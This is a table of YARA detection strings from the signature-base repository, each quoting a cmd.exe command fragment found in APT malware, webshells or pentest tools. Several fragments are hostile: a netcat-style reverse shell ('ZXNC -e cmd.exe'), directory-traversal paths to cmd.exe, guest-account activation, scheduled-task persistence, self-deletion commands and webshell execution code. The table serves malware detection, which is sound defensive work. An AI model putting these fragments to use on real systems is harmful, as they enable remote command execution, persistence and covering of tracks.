[signature-base](https://github.com/Neo23x0/signature-base) | [apt_codoso.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_codoso.yar) | $x1 = "cmd.exe /c ping 127.0.0.1 && ping 127.0.0.1 && sc start %s && ping 127.0.0.1 && sc start %s" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_dnspionage.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_dnspionage.yar) | $s2 = "CMD.exe" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_dustman.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_dustman.yar) | $s1 = "C:\\windows\\system32\\cmd.exe" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_emissary.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_emissary.yar) | $s1 = "cmd.exe /c %s > %s" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_freemilk.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_freemilk.yar) | $s1 = "CMD.EXE /C \"%s\"" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_glassRAT.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_glassRAT.yar) | $s1 = "cmd.exe /c %s" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_glassRAT.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_glassRAT.yar) | $s7 = "cmd.exe /c erase /F \"%s\"" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_golddragon.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_golddragon.yar) | $s1 = "cmd.exe /c systeminfo " fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_golddragon.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_golddragon.yar) | $s4 = "cmd.exe /c tasklist " fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_hafnium_log_sigs.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_hafnium_log_sigs.yar) | $x1 = "cmd.exe /c cd /d C:/inetpub/wwwroot/aspnet_client" ascii wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_hafnium_log_sigs.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_hafnium_log_sigs.yar) | $x2 = "cmd.exe /c cd /d C:\\inetpub\\wwwroot\\aspnet_client" ascii wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_hellsing_kaspersky.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_hellsing_kaspersky.yar) | $cmd = "cmd.exe /c ping 127.0.0.1 -n 5&cmd.exe /c del /a /f \"%s\"" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_hellsing_kaspersky.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_hellsing_kaspersky.yar) | $a2 = "system32\\cmd.exe" wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_hellsing_kaspersky.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_hellsing_kaspersky.yar) | $a10 = "%SystemRoot%\\system32\\cmd.exe" wide  | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_irontiger.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_irontiger.yar) | $s3 = "C:\\Windows\\System32\\cmd.exe /C schtasks /create /tn \"\\Microsoft\\Windows\\PLA\\System\\Microsoft Windows\" /tr " fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_irontiger.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_irontiger.yar) | $s4 = "C:\\Windows\\System32\\cmd.exe /C schtasks /create /tn \"Microsoft Windows\" /tr " fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_keyboys.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_keyboys.yar) | $s9 = "%s\\cmd.exe /c \"%s\"" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_keyboys.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_keyboys.yar) | $s1 = "cmd.exe /c \"%s\"" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_keylogger_cn.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_keylogger_cn.yar) | $s1 = "\\cmd.exe /c \"systeminfo.exe >> " fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_keylogger_cn.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_keylogger_cn.yar) | $s2 = "%s\\cmd.exe /c %s >> \"%s\"" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_laudanum_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_laudanum_webshells.yar) | $s1 = "Executable: <Input type=\"text\" name=\"cmd\" value=\"cmd.exe\"><br>" fullword ascii /* PEStudio Blacklist: strings */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_lazarus_aug20.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_lazarus_aug20.yar) | $str_mask_1 = "cmd.exe /c \"%s >> %s 2>&1\"" ascii wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_lazarus_aug20.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_lazarus_aug20.yar) | $str_mask_2 = "cmd.exe /c \"%s 2>> %s\"" ascii wide  | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_lazarus_dec17.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_lazarus_dec17.yar) | $x7 = "$cmdResult = cmd.exe /c $cmdInst \| Out-String;" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_monsoon.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_monsoon.yar) | $s1 = "cmd.exe /c start " fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_naikon.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_naikon.yar) | $s12 = "\\cmd.exe" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_nk_gen.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_nk_gen.yar) | $s1 = "%s\\cmd.exe /c %s" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_oilrig.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar) | $a2 = "cmd.exe /c " fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_oilrig.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar) | $two3 = "vbs = \"cmd.exe /c SchTasks" ascii wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_oilrig_oct17.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig_oct17.yar) | $s3 = "C:\\windows\\system32\\cmd.exe /c (" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_olympic_destroyer.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_olympic_destroyer.yar) | $x1 = "cmd.exe /c (ping 0.0.0.0 > nul) && if exist %programdata%\\evtchk.txt" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_olympic_destroyer.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_olympic_destroyer.yar) | $x2 = "cmd.exe /c (echo strPath = Wscript.ScriptFullName & echo.Set FSO = CreateObject^(\"Scripting.FileSystemObject\"^)" wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_op_cloudhopper.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_op_cloudhopper.yar) | $x1 = "strNetUse = \"cmd.exe /c net use \\\\\" & host" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_op_cloudhopper.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_op_cloudhopper.yar) | $x2 = "localcmd = \"cmd.exe /c \" & command " ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_op_cloudhopper.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_op_cloudhopper.yar) | $x4 = "strExec = \"cmd.exe /c \" & cmd & \" >> \" & resultfile & \" 2>&1\"  '2>&1 err" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_passcv.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_passcv.yar) | $s1 = "cmd.exe /c MD " fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_passthehashtoolkit.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_passthehashtoolkit.yar) | $s0 = "<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '59.00' */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_passthehashtoolkit.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_passthehashtoolkit.yar) | $s1 = "<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '59.00' */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_poseidon_group.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_poseidon_group.yar) | $s1 = "c:\\winnt\\system32\\cmd.exe" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_poseidon_group.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_poseidon_group.yar) | $s2 = "c:\\windows\\system32\\cmd.exe" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_ruag.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_ruag.yar) | $s3 = "exe = cmd.exe" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_sakula.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_sakula.yar) | $str01 = "cmd.exe /c ping 127.0.0.1 & del \"%s\"" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_sakula.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_sakula.yar) | $str02 = "cmd.exe /c rundll32 \"%s\" Play \"%s\"" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_sakula.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_sakula.yar) | $str04 = "cmd.exe /c cmd.exe /c cmd.exe /c cmd.exe /c cmd.exe /c cmd.exe /c \"%s\"" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_sakula.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_sakula.yar) | $str08 = "cmd.exe /c rundll32 \"%s\" ActiveQvaw \"%s\"" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_scarcruft.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_scarcruft.yar) | $x2 = "cmd.exe /C ping 0.1.1.2" wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_shellcrew_streamex.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_shellcrew_streamex.yar) | $x1 = "cmd.exe /c  \"%s\"" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_snowglobe_babar.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_snowglobe_babar.yar) | $x5 = "cmd.exe" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_sofacy_xtunnel_bundestag.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_sofacy_xtunnel_bundestag.yar) | $x3 = "C:\\Windows\\System32\\cmd.exe" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_suckfly.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_suckfly.yar) | $s1 = "cmd.exe /c %s" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_ta17_293A.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_ta17_293A.yar) | $x2 = "0x00000002, \"C:\\Windows\\System32\\cmd.exe\", \"\"," fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_ta17_318B.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_ta17_318B.yar) | $s3 = "cmd.exe /c %s > %s 2>&1" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_ta18_149A.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_ta18_149A.yar) | $x1 = "cmd.exe /q /c net share adnim$" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_telebots.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_telebots.yar) | $s1 = "cmd = \"cmd.exe /c \" + arg + \" >\" + outfile +\" 2>&1\"" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_telebots.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_telebots.yar) | $s1 = "cmd = \"cmd.exe /c \" + arg + \" \" + arg2" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_terracotta.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_terracotta.yar) | $s0 = "cmd.exe /q /c \"%s\"" fullword ascii  | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_threatgroup_3390.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_threatgroup_3390.yar) | $x1 = "1001=cmd.exe" fullword ascii  | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_thrip.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_thrip.yar) | $s3 = "C:\\WINDOWS\\system32\\cmd.exe" fullword ascii /* Goodware String - occured 2 times */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_thrip.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_thrip.yar) | $s1 = "C:\\Windows\\SysNative\\cmd.exe" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_thrip.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_thrip.yar) | $x1 = "$.oS.Run('cmd.exe /c '+a+'" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_thrip.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_thrip.yar) | $s1 = "pGlobal->nOSType==64--%s\\cmd.exe %s" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_thrip.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_thrip.yar) | $s1 = "%s\\cmd.exe /c %s" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_turla.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_turla.yar) | $x1 = "sc %s create %s binPath= \"cmd.exe /c start %%SystemRoot%%\\%s\">>%s" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_turla.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_turla.yar) | $x2 = "cmd.exe /c start %%SystemRoot%%\\%s" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_turla.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_turla.yar) | $x3 = "cmd.exe /c %s\\%s -s %s:%s:%s -c \"%s %s /wait 1\">>%s" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_winnti.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_winnti.yar) | $a7 = "cmd.exe" wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_winnti.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_winnti.yar) | $a11 = "\\cmd.exe" wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_winnti_burning_umbrella.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_winnti_burning_umbrella.yar) | $x1 = "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"%s\"" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_zxshell.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_zxshell.yar) | $x1 = "CMD.EXE /C NET USER GUEST /ACTIVE:yes && NET USER GUEST ++++++" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_zxshell.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_zxshell.yar) | $x5 = "ping 127.0.0.1 -n 7&cmd.exe /c net start %s" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_zxshell.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_zxshell.yar) | $x6 = "ZXNC -e cmd.exe x.x.x.x" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [cn_pentestset_scripts.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_scripts.yar) | $s2 = "if ShellPath=\"\" Then ShellPath = \"c:\\\\windows\\\\system32\\\\cmd.exe\"" fullword ascii /* PEStudio Blacklist: strings */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [cn_pentestset_tools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_tools.yar) | $s5 = "cmd.exe" fullword ascii /* PEStudio Blacklist: strings */ /* Goodware String - occured 120 times */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [cn_pentestset_tools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_tools.yar) | $s3 = "SETP c:\\windows\\system32\\cmd.exe " fullword wide /* PEStudio Blacklist: strings */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [cn_pentestset_tools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_tools.yar) | $s1 = "Usage : ms11-080.exe cmd.exe Command " fullword ascii /* PEStudio Blacklist: strings */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [cn_pentestset_tools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_tools.yar) | $s1 = "/msadc/..%5c..%5c..%5c..%5cwinnt/system32/cmd.exe" fullword wide /* PEStudio Blacklist: strings */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [cn_pentestset_tools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_tools.yar) | $s2 = "msadc/..\\..\\..\\..\\winnt/system32/cmd.exe" fullword wide /* PEStudio Blacklist: strings */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [cn_pentestset_tools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_tools.yar) | $s1 = "C:\\WINDOWS\\system32\\cmd.exe" fullword wide /* PEStudio Blacklist: strings */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [cn_pentestset_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_webshells.yar) | $s1 = "<cfexecute name=\"cmd.exe\"" fullword ascii /* PEStudio Blacklist: strings */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [cn_pentestset_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_webshells.yar) | $s1 = "if shellpath=\"\" then shellpath = \"cmd.exe\"" fullword ascii /* PEStudio Blacklist: strings */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [cn_pentestset_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_webshells.yar) | $s0 = "response.write oScriptlhn.exec(\"cmd.exe /c\" & request(\"c\")).stdout.readall" fullword ascii /* PEStudio Blacklist: strings */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [cn_pentestset_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_webshells.yar) | $s0 = "<cfexecute name=\"C:\\Winnt\\System32\\cmd.exe\"" fullword ascii /* PEStudio Blacklist: strings */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [cn_pentestset_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_webshells.yar) | $s2 = "if ShellPath=\"\" Then ShellPath = \"cmd.exe\"" fullword ascii /* PEStudio Blacklist: strings */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [cn_pentestset_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_webshells.yar) | $s0 = "fputs ($conn_id, \"SITE EXEC \".$dir.\"cmd.exe /c \".$cmd.\"\\r\\n\");" fullword ascii /* PEStudio Blacklist: strings */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [cn_pentestset_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_webshells.yar) | $s16 = "If LCase(appName) = \"cmd.exe\" And appArgs <> \"\" Then" fullword ascii /* PEStudio Blacklist: strings */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [cn_pentestset_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_webshells.yar) | $s10 = "if (cmd == null) cmd = \"cmd.exe /c set\";" fullword ascii /* PEStudio Blacklist: strings */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [cn_pentestset_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_webshells.yar) | $s11 = "if (program == null) program = \"cmd.exe /c net start > \"+SHELL_DIR+\"/Log.txt" ascii /* PEStudio Blacklist: strings */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [cn_pentestset_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_webshells.yar) | $s1 = "Str[17] = \"select shell('c:\\windows\\system32\\cmd.exe /c net user b4che10r ab" ascii /* PEStudio Blacklist: strings */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [cn_pentestset_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_webshells.yar) | $s1 = "<cfexecute name=\"C:\\Winnt\\System32\\cmd.exe\"" fullword ascii /* PEStudio Blacklist: strings */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [cn_pentestset_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_webshells.yar) | $s1 = "If jzgm=\"\"Then jzgm=\"cmd.exe /c net user\"" fullword ascii /* PEStudio Blacklist: strings */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
